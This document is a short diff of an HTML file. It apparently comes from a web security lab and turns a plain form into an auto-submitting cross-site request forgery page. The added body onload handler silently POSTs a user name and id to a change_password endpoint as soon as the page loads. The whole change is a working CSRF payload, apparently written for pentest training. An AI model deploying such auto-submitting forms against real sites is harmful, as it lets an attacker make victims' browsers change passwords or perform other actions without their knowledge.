@@ -1,15 +1,8 @@
 ﻿<html>
-<form enctype="application/x-www-form-urlencoded" method="POST" action="http://ptl-f68bd164-879b4cae.libcurl.so/share">
-    <table>
-        <tr>
-            <td>user</td>
-            <td><input type="text" value="gpentest" name="user"></td>
-        </tr>
-        <tr>
-            <td>id</td>
-            <td><input type="text" value="0" name="id"></td>
-        </tr>
-    </table><input type="submit" value="http://ptl-f68bd164-879b4cae.libcurl.so/share">
+<body onload=document.getElementById('csrf').submit()>
+<form id="csrf" action="http://example/change_password" method="POST">
+<input name='user' type='text' value="gpentest">
+<input name="id" type="text" value="0">
 </form>
-
+</body>
 </html>
